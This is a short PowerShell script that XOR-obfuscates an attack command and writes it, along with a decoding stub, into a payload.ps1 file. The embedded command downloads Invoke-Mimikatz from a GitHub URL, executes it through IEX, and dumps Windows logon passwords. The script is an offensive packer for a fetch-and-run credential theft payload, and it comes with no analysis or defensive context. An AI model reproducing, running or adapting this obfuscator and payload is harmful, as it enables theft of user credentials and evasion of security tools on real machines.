function xor_rotate($plaintext, $key)
{
  $cyphertext = ""
  $keyposition = 0
  $KeyArray = $key.ToCharArray()
  $plaintext.ToCharArray() | foreach-object -process {
      $cyphertext += [char]([byte][char]$_ -bxor $KeyArray[$keyposition])
      $keyposition += 1
      if ($keyposition -eq $key.Length) {$keyposition = 0}
  }
  return $cyphertext
}

function encrypt_payload($cle, $key)
{
    $cyp = xor_rotate $cle $key
    $arr_cyp = $cyp.ToCharArray()

    Write-Host -NoNewLine "[byte[]] `$payload = "
    "[byte[]] `$payload = " | Out-File -NoNewLine payload.ps1
    foreach ($elem in $arr_cyp)
    {
        $elem_value = [byte]$elem
        Write-Host -NoNewLine "$elem_value,"
        #Start-Sleep -MilliSeconds 50
        "$elem_value," | Out-File -NoNewLine -Append payload.ps1
    }
}

function build_footer($key)
{
	' ' | Out-File -Append payload.ps1
	' ' | Out-File -Append payload.ps1
	'function xor_rotate($plaintext, $key)' | Out-File -Append payload.ps1
	'{' | Out-File -Append payload.ps1
	'  $cyphertext = ""' | Out-File -Append payload.ps1
	'  $keyposition = 0' | Out-File -Append payload.ps1
	'  $KeyArray = $key.ToCharArray()' | Out-File -Append payload.ps1
	'  $plaintext.ToCharArray() | foreach-object -process {' | Out-File -Append payload.ps1
	'	   $cyphertext += [char]([byte][char]$_ -bxor $KeyArray[$keyposition])' | Out-File -Append payload.ps1
	'	   $keyposition += 1' | Out-File -Append payload.ps1
	'	   if ($keyposition -eq $key.Length) {$keyposition = 0}' | Out-File -Append payload.ps1
	'  }' | Out-File -Append payload.ps1
	'  return $cyphertext' | Out-File -Append payload.ps1
	'}' | Out-File -Append payload.ps1
	'' | Out-File -Append payload.ps1
	"`$key = `"$key`"" | Out-File -Append payload.ps1
	'$pString = [System.Text.Encoding]::UTF8.GetString($payload)'  | Out-File -Append payload.ps1
	'$cmd = xor_rotate $pString $key' | Out-File -Append payload.ps1
	'Write-Host "Payload: $cmd"' | Out-File -Append payload.ps1
	'Write-Host "Invoke-Expression $cmd"' | Out-File -Append payload.ps1
}

#Encrypt Payload:
$cle = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fugitivus/deftooth/master/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command `"privilege::debug sekurlsa::logonpasswords`""
#$key = [string][char]0
$key ="Test"
encrypt_payload $cle $key
build_footer $key


